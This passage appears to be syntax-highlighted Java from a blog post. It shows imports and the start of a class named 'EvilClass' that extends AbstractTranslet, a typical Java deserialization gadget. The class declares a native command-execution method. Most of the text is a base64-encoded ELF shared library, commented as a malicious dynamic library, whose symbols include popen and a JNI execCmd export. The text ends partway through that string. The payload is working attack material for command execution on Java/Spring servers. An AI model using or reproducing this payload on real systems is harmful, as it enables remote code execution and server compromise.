+<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span>RequestContextHolder<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>RequestMappingInfo<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RequestMappingHandlerMapping<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>RandomAccessFile<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Vector<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">native</span> String <span class="token function">execCmd</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">//恶意动态链接库文件的base64编码</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String EVIL_JNI_BASE64 <span class="token operator">=</span> <span class="token string">"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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPMPHvpIg+wISIsF2S8AAEiFwHQC/9BIg8QIwwAAAAAA/zXiLwAA8v8l4y8AAA8fAPMPHvpoAAAAAPLp4f///5DzDx76aAEAAADy6dH///+Q8w8e+mgCAAAA8unB////kPMPHvpoAwAAAPLpsf///5DzDx76aAQAAADy6aH///+Q8w8e+mgFAAAA8umR////kPMPHvpoBgAAAPLpgf///5DzDx76aAcAAADy6XH///+Q8w8e+vL/JT0vAAAPH0QAAPMPHvry/yVNLwAADx9EAADzDx768v8lRS8AAA8fRAAA8w8e+vL/JT0vAAAPH0QAAPMPHvry/yU1LwAADx9EAADzDx768v8lLS8AAA8fRAAA8w8e+vL/JSUvAAAPH0QAAPMPHvry/yUdLwAADx9EAADzDx768v8lFS8AAA8fRAAASI09GS8AAEiNBRIvAABIOfh0FUiLBYYuAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI096S4AAEiNNeIuAABIKf5IifBIwe4/SMH4A0gBxkjR/nQUSIsFVS4AAEiFwHQI/+BmDx9EAADDDx+AAAAAAPMPHvqAPaUuAAAAdStVSIM9Mi4AAABIieV0DEiLPYYuAADo2f7//+hk////xgV9LgAAAV3DDx8Aww8fgAAAAADzDx766Xf////zDx76VUiJ5UiB7AAQAABIgwwkAEiB7AAQAABIgwwkAEiB7AAQAABIgwwkAEiD7DBIib3Yz///SIm10M///2RIiwQlKAAAAEiJRfgxwEiLhdjP//9IjRWsDQAASInWSInH6MH+//9IiYXoz///SIO96M///wB1QLgAAAAA62BIi5Xoz///SI2F8M///76AAAAASInH6F7+//9IhcB0GUiNlfDP//9Ii4XQz///SInWSInH6ID+//9Ii4Xoz///SInH6EH+//+FwHS0SIuF6M///0iJx+j+/f//uAEAAABIi1X4ZEgrFCUoAAAAdAXo1f3//8nD8w8e+lVIieVIgewAEAAASIMMJABIgewAEAAASIMMJABIgewAEAAASIMMJABIgeywAAAASIm9aM///0iJtWDP//9IiZVYz///ZEiLBCUoAAAASIlF+DHASIuFaM///0iLAEyLgEgFAABIi41Yz///SIuFaM///7oAAAAASInOSInHQf/QSImFcM///0jHhfDP//8AAAAASMeF+M///wAAAABIjYUA0P//uvAvAAC+AAAAAEiJx+g5/f//SI2V8M///0iLhXDP//9IidZIicfoUP3//0jHhYDP//8AAAAASMeFiM///wAAAABIx4WQz///AAAAAEjHhZjP//8AAAAASMeFoM///wAAAABIx4Woz///AAAAAEjHhbDP//8AAAAASMeFuM///wAAAABIx4XAz///AAAAAEjHhcjP//8AAAAASMeF0M///wAAAABIx4XYz///AAAAAMeF4M///wAAAABIjZXwz///SI2FgM///0iJ1kiJx+jJ/P//SIuFaM///0iLAEiLiDgFAABIjZWAz///SIuFaM///0iJ1kiJx//RSImFeM///0iLhXjP//9Ii1X4ZEgrFCUoAAAAdAXoEPz//8nDAADzDx76SIPsCEiDxAjDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByAAAAARsDOzAAAAAFAAAAHPD//0wAAACs8P//dAAAALzw//+MAAAA9fH//6QAAADp8v//xAAAABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEAACQAAAAcAAAAyO///5AAAAAADhBGDhhKDwt3CIAAPxo6KjMkIgAAAAAUAAAARAAAADDw//8QAAAAAAAAAAAAAAAUAAAAXAAAACjw//+AAAAAAAAAAAAAAAAcAAAAdAAAAEnx///0AAAAAEUOEIYCQw0GAusMBwgAABwAAACUAAAAHfL//8UBAAAARQ4QhgJDDQYDvAEMBwgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA